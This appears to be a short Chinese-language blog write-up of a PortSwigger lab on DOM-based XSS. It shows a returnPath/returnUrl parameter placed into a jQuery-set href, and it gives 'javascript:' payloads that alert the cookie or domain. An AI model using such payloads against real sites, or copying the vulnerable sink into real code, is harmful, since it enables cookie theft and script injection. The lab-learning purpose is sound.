在提交反馈页面

url中输入随机字符发现，字符出现在页面的href属性中。



payload:

```javascript
?returnPath=javascript:alert(document.cookie)
```

此时页面中出现的url中输入的参数

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/xss/images/A0BDBFFD81894F4F95BD0B1F4313BDB4clipboard.png)

点击即可触发弹框。



# 解释：

这里使用jquery库

获取url中的参数更改锚元素

例子：

```javascript
$(function(){
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

可以通过修改URL来利用此漏洞，以使location.search源包含恶意JavaScript URL。页面的JavaScript将此恶意URL应用于反向链接的后href，单击反向链接将执行该恶意URL ：

?returnUrl=javascript:alert(document.domain)